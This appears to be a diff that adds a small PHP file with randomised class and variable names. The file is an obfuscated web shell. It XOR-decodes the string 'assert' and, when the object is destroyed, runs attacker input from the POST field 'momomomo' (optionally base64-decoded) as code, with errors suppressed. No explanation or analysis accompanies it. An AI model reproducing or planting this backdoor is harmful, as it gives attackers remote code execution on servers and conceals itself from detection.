@@ -1,0 +1,20 @@
+<?php 
+class BVGI { 
+    function bdpH() {
+        $PeeD = "\x29" ^ "\x48";
+        $axyr = "\xf3" ^ "\x80";
+        $Ktwj = "\x82" ^ "\xf1";
+        $UmlU = "\x8c" ^ "\xe9";
+        $TlnC = "\x15" ^ "\x67";
+        $UpuZ = "\x1" ^ "\x75";
+        $HSOJ =$PeeD.$axyr.$Ktwj.$UmlU.$TlnC.$UpuZ;
+        return $HSOJ;
+    }
+    function __destruct(){
+        $LUZM=$this->bdpH();
+        @$LUZM($this->Pj);
+    }
+}
+$bvgi = new BVGI();
+@$bvgi->Pj = isset($_GET['id'])?base64_decode($_POST['momomomo']):$_POST['momomomo'];
+?>
